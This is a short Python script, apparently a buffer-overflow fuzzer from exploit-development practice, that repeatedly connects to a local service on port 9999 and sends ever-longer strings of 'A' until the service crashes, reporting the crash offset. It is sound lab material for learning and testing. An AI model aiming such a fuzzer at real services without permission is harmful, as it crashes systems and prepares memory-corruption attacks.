import socket, re, time
from colorama import Fore

def test():
  test

def main():
  socket.setdefaulttimeout(1)
  OFFSET = 10
  CHARACTER = "A"
  TARGET = "127.0.0.1"
  TARGET_PORT = 9999
  while(OFFSET < 5000):
    try:
      print("Creating socket\t\t . . . . . ", end='')
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      print(Fore.GREEN + "SOCKET INITIALIZED" + Fore.RESET)
    except:
      print(Fore.RED + "FAIL TO INITIALIZE SOCKET" + Fore.RESET)
      exit(1)
    try:
      print("Connecting to target\t . . . . . ", end="")
      s.connect((TARGET, TARGET_PORT))
    except:
      print(Fore.RED + "FAIL TO CONNECT TO TARGET" + Fore.RESET)
      exit(1)
    print(Fore.GREEN + "CONNECTED" + Fore.RESET)

    RETURNED_DATA = s.recv(1024)
    #print(f"RETURNED_DATA : \n{RETURNED_DATA.decode()}")
    try:
      print(f"Sending {OFFSET} bytes\t . . . . . ", end="")
      s.send((CHARACTER * OFFSET).encode())
      print(Fore.GREEN + "BYTES SENT" + Fore.RESET)
      OFFSET += 5
      print("Receiving response\t . . . . . ", end="")
      RETURNED_DATA = s.recv(1024).decode()
      print(Fore.GREEN + "RECEIVED DATA" + Fore.RESET)
      print("Value Received\t\t . . . . . ", end="")
      print(Fore.GREEN + re.sub(r'\W+', "", RETURNED_DATA) + Fore.RESET + "\n")
      s.close()
    except socket.timeout:
      print(Fore.RED + f"PROGRAM CRASHED AT {OFFSET} BYTES" + Fore.RESET)
      exit(1)
    except:
      print(Fore.RED + "ERROR SENDING BYTES" + Fore.RESET)
      exit(1)
    time.sleep(0.00005)
   
main()